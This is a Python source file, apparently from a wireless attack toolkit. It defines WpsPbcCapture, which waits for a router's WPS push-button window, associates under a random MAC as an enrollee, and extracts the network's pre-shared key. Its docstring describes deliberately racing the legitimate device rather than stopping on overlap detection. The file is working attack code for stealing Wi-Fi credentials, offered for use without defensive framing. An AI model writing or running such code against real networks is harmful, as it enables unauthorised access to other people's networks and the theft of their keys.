"""WpsPbcCapture — live orchestrator for opportunistic WPS Push-Button capture.

Given an AP in (or entering) its PBC walk window, associate as an Enrollee and
run the WpsEnrollee exchange to extract the PSK from M8. This is the active piece
the Scanner/Focus arming wires to; detection itself is passive
(``AccessPoint.wps_pbc_active``).

Overlap policy: we do NOT self-abort on MULTIPLE_PBC_DETECTED — we race to finish
first (the decision locked in the README). WpsEnrollee surfaces such a refusal as
PROTO_ERROR, and the caller simply retries on the next window.
"""

from __future__ import annotations

import logging
from typing import Optional

from .association import WPS_REQ_ENROLLEE, WlanTransport, WpsAssociation, random_client_mac, str_to_mac
from .enrollee import WpsEnrollee
from .registrar import AttemptOutcome, PinResult

logger = logging.getLogger(__name__)


class WpsPbcCapture:
    def __init__(self, iface, target, our_mac: Optional[bytes] = None, log=None,
                 tx_observer=None):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid.lower()
        self.channel = target.channel
        self.our_mac = our_mac or random_client_mac()
        self.log = log or logger.info
        self.tx_observer = tx_observer        # optional: record our TX (probe pcap)

    async def capture(self) -> AttemptOutcome:
        """One PBC enrollment attempt. Returns the WpsEnrollee outcome (SUCCESS
        carries the SSID + PSK)."""
        assoc = WpsAssociation(self.iface, self.bssid, self.target.ssid or "",
                               self.channel, our_mac=self.our_mac,
                               wps_request_type=WPS_REQ_ENROLLEE)
        assoc.start()
        transport = WlanTransport(self.iface, str_to_mac(self.bssid), self.our_mac,
                                  tx_observer=self.tx_observer)
        transport.start()
        try:
            if await assoc.associate():
                self.log(f"[WPS-PBC] associated as {self.our_mac.hex()}")
            else:
                self.log(f"[WPS-PBC] assoc failed ({assoc.fail_reason}); "
                         "running EAPOL anyway in case the AP engages")
            outcome = await WpsEnrollee(transport, str_to_mac(self.bssid),
                                        self.our_mac, log=self.log).run()
        finally:
            transport.stop()
            assoc.stop()

        if outcome.result is PinResult.SUCCESS:
            self.log(f"[WPS-PBC] captured PSK for {outcome.ssid!r}: {outcome.psk}")
        return outcome
